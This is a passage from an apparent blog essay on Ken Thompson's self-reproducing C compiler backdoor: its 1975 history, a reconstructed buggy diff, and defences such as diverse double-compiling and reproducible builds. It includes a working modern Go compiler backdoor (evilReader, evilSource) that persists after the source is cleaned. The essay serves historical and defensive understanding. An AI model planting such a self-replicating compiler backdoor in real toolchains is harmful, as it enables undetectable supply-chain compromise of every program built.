    &lt;quote&gt;% hexdump -C nih.a 00000000 6d ff 78 2e 63 00 00 00 00 00 46 0a 6b 64 06 b6 |m.x.c.....F.kd..| 00000010 22 05 6e 69 68 66 6c 67 3b 0a 63 6f 64 65 6e 69 |".nihflg;.codeni| ... 00000530 7d 0a 7d 0a 72 63 00 00 00 00 00 00 46 0a eb 5e |}.}.rc......F..^| 00000540 06 b6 8d 00 65 64 20 78 2e 63 0a 31 2c 24 73 2f |....ed x.c.1,$s/| % date -r 0x0a46646b # BSD date. On Linux: date -d @$((0x0a46646b)) Thu Jun 19 00:49:47 EDT 1975 % date -r 0x0a465eeb Thu Jun 19 00:26:19 EDT 1975 %&lt;/quote&gt;
    &lt;p&gt;So the code was done by June 1975.&lt;/p&gt;
    &lt;head rend="h2"&gt;Controlled Deployment&lt;/head&gt;
    &lt;p&gt;In addition to the quote above from the Q&amp;amp;A, the story of the deployment of the backdoor has been told publicly many times (1 2 3 4 5 6 7), sometimes with conflicting minor details. Based on these many tellings, it seems clear that it was the PWB group (not USG as sometimes reported) that was induced to copy the backdoored C compiler, that eventually the login program on that system got backdoored too, that PWB discovered something was amiss because the compiler got bigger each time it compiled itself, and that eventually they broke the reproduction and ended up with a clean compiler.&lt;/p&gt;
    &lt;p&gt;John Mashey tells the story of the PWB group obtaining and discovering the backdoor and then him overhearing Ken and Robert H. Morris discussing it (1 2 3 (pp. 29-30) 4). In Mashey’s telling, PWB obtained the backdoor weeks after he read John Brunner’s classic book Shockwave Rider, which was published in early 1975. (It appeared in the “New Books” list in the New York Times on March 5, 1975 (p. 37).)&lt;/p&gt;
    &lt;p&gt;All tellings of this story agree that the compiler didn’t make it any farther than PWB. Eric S. Raymond’s Jargon File contains an entry for backdoor with rumors to the contrary. After describing Ken’s work, it says:&lt;/p&gt;
    &lt;quote&gt;Ken says the crocked compiler was never distributed. Your editor has heard two separate reports that suggest that the crocked login did make it out of Bell Labs, notably to BBN, and that it enabled at least one late-night login across the network by someone using the login name “kt”.&lt;/quote&gt;
    &lt;p&gt;I mentioned this to Ken, and he said it could not have gotten to BBN. The technical details don’t line up either: as we just saw, the login change only accepts “codenih” as a password for an account that already exists. So the Jargon File story is false.&lt;/p&gt;
    &lt;p&gt;Even so, it turns out that the backdoor did leak out in one specific sense. In 1997, Dennis Ritchie gave Warren Toomey (curator of the TUHS archive) a collection of old tape images. Some bits were posted then, and others were held back. In July 2023, Warren posted and announced the full set. One of the tapes contains various files from Ken, which Dennis had described as “A bunch of interesting old ken stuff (eg a version of the units program from the days when the dollar fetched 302.7 yen).” Unnoticed in those files is &lt;code&gt;nih.a&lt;/code&gt;, dated July 3, 1975.
When I wrote to Ken, he sent me a slightly different &lt;code&gt;nih.a&lt;/code&gt;:
it contained the exact same files, but dated January 28, 1998,
and in the modern textual archive format rather than the binary V6 format.
The V6 simulator contains the &lt;code&gt;nih.a&lt;/code&gt; from Dennis’s tapes.
&lt;/p&gt;
    &lt;head rend="h2"&gt;A Buggy Version&lt;/head&gt;
    &lt;p&gt; The backdoor was noticed because the compiler got one byte larger each time it compiled itself. About a decade ago, Ken told me that it was an extra NUL byte added to a string each time, “just a bug.” We can see which string constant it must have been (&lt;code&gt;nihstr&lt;/code&gt;),
but the version we just built does not have that bug—Ken says he didn’t save the buggy version.
An interesting game would be to try to reconstruct the most plausible diff that
reintroduces the bug.
&lt;/p&gt;
    &lt;p&gt; It seems to me that to add an extra NUL byte each time, you need to use &lt;code&gt;sizeof&lt;/code&gt; to decide
when to stop the iteration, instead of stopping at the first NUL.
My best attempt is:
&lt;/p&gt;
    &lt;quote&gt;repronih() { int i,n,c; if(nihflg!=3) return; - n=0; - i=0; - for(;;) + for(n=0; n&amp;lt;5; n++) + for(i=0; i&amp;lt;sizeof nihstr; ) switch(c=nihstr[i++]){ case 045: n++; if(n==1) i=0; if(n!=2) continue; default: if(n==1||n==2){ putc('0',obuf); if(c&amp;gt;=0100) putc((c&amp;gt;&amp;gt;6)+'0',obuf); if(c&amp;gt;=010) putc(((c&amp;gt;&amp;gt;3)&amp;amp;7)+'0',obuf); putc((c&amp;amp;7)+'0',obuf); putc(',',obuf); putc('\n',obuf); continue; } if(n!=3) putc(c,obuf); continue; - case 0: - n++; - i=0; - if(n==5){ - fflush(obuf); - return; - } } + fflush(obuf); }&lt;/quote&gt;
    &lt;p&gt; I doubt this was the actual buggy code, though: it’s too structured compared to the fixed version. And if the code had been written this way, it would have been easier to remove the 0 being added in the &lt;code&gt;rc&lt;/code&gt; script
than to complicate the code. But maybe.
&lt;/p&gt;
    &lt;p&gt; Also note that the compiler cannot get one byte larger each time it compiles itself, because V6 Unix binaries were rounded up to a 2-byte boundary. While &lt;code&gt;nihstr&lt;/code&gt; gets one byte larger each time,
the compiler binary gets two bytes larger every second time.
&lt;/p&gt;
    &lt;head rend="h2"&gt;A Modern Version&lt;/head&gt;
    &lt;p&gt;Even seeing the code run in the V6 simulator, it can be easy to mentally dismiss this kind of backdoor as an old problem. Here is a more modern variant.&lt;/p&gt;
    &lt;p&gt; The Go compiler reads input files using a routine called &lt;code&gt;Parse&lt;/code&gt;
in the package &lt;code&gt;cmd/compile/internal/syntax&lt;/code&gt;.
The input is abstracted as an &lt;code&gt;io.Reader&lt;/code&gt;,
so if we want to replace the input, we need to interpose a new reader.
We can do that easily enough:
&lt;/p&gt;
    &lt;code&gt;
     var p parser
+    src = &amp;amp;evilReader{src: src}
     p.init(base, src, errh, pragh, mode)
&lt;/code&gt;
    &lt;p&gt; Then we need to implement &lt;code&gt;evilReader&lt;/code&gt;, which is not too difficult either:
&lt;/p&gt;
    &lt;quote&gt;type evilReader struct { src io.Reader data []byte err error } func (r *evilReader) Read(b []byte) (int, error) { if r.data == nil { data, err := io.ReadAll(r.src) s := string(data) if evilContains(s, "package main") &amp;amp;&amp;amp; evilContains(s, "\"hello, world\\n\"") { s = evilReplace(s, "\"hello, world\\n\"", "\"backdoored!\\n\"") } if evilContains(s, "package syntax") &amp;amp;&amp;amp; evilContains(s, "\nfunc Parse(base *PosBase, src io.Reader") { s = evilReplace(s, "p.init(base, src, errh, pragh, mode)", "src=&amp;amp;evilReader{src:src}; p.init(base, src, errh, pragh, mode)") s += evilSource() } r.data = []byte(s) r.err = err } if r.err != nil { return 0, r.err } n := copy(b, r.data) r.data = r.data[n:] if n == 0 { return 0, io.EOF } return n, nil }&lt;/quote&gt;
    &lt;p&gt; The first replacement rewrites a “hello, world” program to a “backdoored!” program. The second replacement reproduces the change inside the compiler. To make this work inside the compiler, we need &lt;code&gt;evilSource&lt;/code&gt; to return
the source code of the &lt;code&gt;evilReader&lt;/code&gt;,
which we know how to do.
The &lt;code&gt;evilContains&lt;/code&gt; and &lt;code&gt;evilReplace&lt;/code&gt;
functions are reimplementations of &lt;code&gt;strings.Contains&lt;/code&gt; and &lt;code&gt;strings.Replace&lt;/code&gt;,
since the code in question does not import &lt;code&gt;strings&lt;/code&gt;,
and the build system may not have provided it for the compiler to import.
&lt;/p&gt;
    &lt;p&gt;Completing the code:&lt;/p&gt;
    &lt;code&gt;
func evilIndex(s, t string) int {
    for i := 0; i &amp;lt; len(s)-len(t); i++ {
        if s[i:i+len(t)] == t {
            return i
        }
    }
    return -1
}

func evilContains(s, t string) bool {
    return evilIndex(s, t) &amp;gt;= 0
}

func evilReplace(s, old, new string) string {
    i := evilIndex(s, old)
    if i &amp;lt; 0 {
        return s
    }
    return s[:i] + new + s[i+len(old):]
}

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}

var evilText = `
type evilReader struct {
    src  io.Reader
    data []byte
    err  error
}

...

func evilSource() string {
    return "\n\n" + evilText + "\nvar evilText = \x60" + evilText + "\x60\n"
}
`
&lt;/code&gt;
    &lt;p&gt;Now we can install it, delete the source code changes, and install the compiler from clean sources. The change persists:&lt;/p&gt;
    &lt;quote&gt;% go install cmd/compile % git stash Saved working directory ... % git diff # source is clean! % go install cmd/compile % cat &amp;gt;x.go package main func main() { print("hello, world\n") } ^D % go run x.go backdoored! %&lt;/quote&gt;
    &lt;head rend="h2"&gt;Reflections on Reflections&lt;/head&gt;
    &lt;p&gt;With all that experience behind us, a few observations from the vantage point of 2023.&lt;/p&gt;
    &lt;p&gt;It’s short! When Ken sent me &lt;code&gt;nih.a&lt;/code&gt; and I got it running,
my immediate reaction was disbelief at the size of the change: 99 lines of code,
plus a 20-line shell script.
If you already know how to make a program print itself,
the biggest surprise is that there are no surprises!

&lt;/p&gt;
    &lt;p&gt;It’s one thing to say “I know how to do it in theory” and quite another to see how small and straightforward the backdoor is in practice. In particular, hooking into source code reading makes it trivial. Somehow, I’d always imagined some more complex pattern matching on an internal representation in the guts of the compiler, not a textual substitution. Seeing it run, and seeing how tiny it is, really drives home how easy it would be to make a change like this and how important it is to build from trusted sources using trusted tools.&lt;/p&gt;
    &lt;p&gt;I don’t say any of this to put down Ken’s doing it in the first place: it seems easy because he did it and explained it to us. But it’s still very little code for an extremely serious outcome.&lt;/p&gt;
    &lt;p&gt;Bootstrapping Go. In the early days of working on and talking about Go, people often asked us why the Go compiler was written in C, not Go. The real reason is that we wanted to spend our time making Go a good language for distributed systems and not on making it a good language for writing compilers, but we would also jokingly respond that people wouldn’t trust a self-compiling compiler from Ken. After all, he had ended his Turing lecture by saying:&lt;/p&gt;
    &lt;quote&gt;The moral is obvious. You can’t trust code that you did not totally create yourself. (Especially code from companies that employ people like me.) No amount of source-level verification or scrutiny will protect you from using untrusted code.&lt;/quote&gt;
    &lt;p&gt;Today, however, the Go compiler does compile itelf, and that prompts the important question of why it should be trusted, especially when a backdoor is so easy to add. The answer is that we have never required that the compiler rebuild itself. Instead the compiler always builds from an earlier released version of the compiler. This way, anyone can reproduce the current binaries by starting with Go 1.4 (written in C), using Go 1.4 to compile Go 1.5, Go 1.5 to compile Go 1.6, and so on. There is no point in the cycle where the compiler is required to compile itself, so there is no place for a binary-only backdoor to hide. In fact, we recently published programs to make it easy to rebuild and verify the Go toolchains, and we demonstrated how to use them to verify one version of Ubuntu’s Go toolchain without using Ubuntu at all. See “Perfectly Reproducible, Verified Go Toolchains” for details.&lt;/p&gt;
    &lt;p&gt;Bootstrapping Trust. An important advancement since 1983 is that we know a defense against this backdoor, which is to build the compiler source two different ways.&lt;/p&gt;
    &lt;p&gt;Specifically, suppose we have the suspect binary – compiler 1 – and its source code. First, we compile that source code with a trusted second compiler, compiler 2, producing compiler 2.1. If everything is on the up-and-up, compiler 1 and compiler 2.1 should be semantically equivalent, even though they will be very different at the binary level, since they were generated by different compilers. Also, compiler 2.1 cannot contain a binary-only backdoor inserted by compiler 1, since it wasn’t compiled with that compiler. Now we compile the source code again with both compiler 1 and compiler 2.1. If they really are semantically equivalent, then the outputs, compilers 1.1 and 2.1.1, should be bit-for-bit identical. If that’s true, then we’ve established that compiler 1 does not insert any backdoors when compiling itself.&lt;/p&gt;
    &lt;p&gt;The great thing about this process is that we don’t even need to know which of compiler 1 and 2 might be backdoored. If compilers 1.1 and 2.1.1 are identical, then they’re either both clean or both backdoored the same way. If they are independent implementations from independent sources, the chance of both being backdoored the same way is far less likely than the chance of compiler 1 being backdoored. We’ve bootstrapped trust in compiler 1 by comparing it against compiler 2, and vice versa.&lt;/p&gt;
    &lt;p&gt;Another great thing about this process is that compiler 2 can be a custom, small translator that’s incredibly slow and not fully general but easier to verify and trust. All that matters is that it can run well enough to produce compiler 2.1, and that the resulting code runs well enough to produce compiler 2.1.1. At that point, we can switch back to the fast, fully general compiler 1.&lt;/p&gt;
    &lt;p&gt;This approach is called “diverse double-compiling,” and the definitive reference is David A. Wheeler’s PhD thesis and related links.&lt;/p&gt;
    &lt;p&gt;Reproducible Builds. Diverse double-compiling and any other verifying of binaries by rebuilding source code depends on builds being reproducible. That is, the same inputs should produce the same outputs. Computers being deterministic, you’d think this would be trivial, but in modern systems it is not. We saw a tiny example above, where compiling the code as &lt;code&gt;ccevil.c&lt;/code&gt;
produced a different binary than compiling
the code as &lt;code&gt;cc.c&lt;/code&gt;
because the compiler embedded the file name
in the executable.
Other common unwanted build inputs include
the current time, the current directory,
the current user name, and many others,
making a reproducible build far more difficult than it should be.
The Reproducible Builds
project collects resources to help people achieve this goal.
&lt;/p&gt;
    &lt;p&gt;Modern Security. In many ways, computing security has regressed since the Air Force report on Multics was written in June 1974. It suggested requiring source code as a way to allow inspection of the system on delivery, and it raised this kind of backdoor as a potential barrier to that inspection. Half a century later, we all run binaries with no available source code at all. Even when source is available, as in open source operating systems like Linux, approximately no one checks that the distributed binaries match the source code. The programming environments for languages like Go, NPM, and Rust make it trivial to download and run source code published by strangers on the internet, and again almost no one is checking the code, until there is a problem. No one needs Ken’s backdoor: there are far easier ways to mount a supply chain attack.&lt;/p&gt;
    &lt;p&gt;On the other hand, given all our reckless behavior, there are far fewer problems than you would expect. Quite the opposite: we trust computers with nearly every aspect of our lives, and for the most part nothing bad happens. Something about our security posture must be better than it seems. Even so, it might be nicer to live in a world where the only possible attacks required the sophistication of approaches like Ken’s (like in this excellent science fiction story).&lt;/p&gt;
    &lt;p&gt;We still have work to do.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://research.swtch.com/nih"/><published>2025-11-16T13:59:19+00:00</published></entry></feed>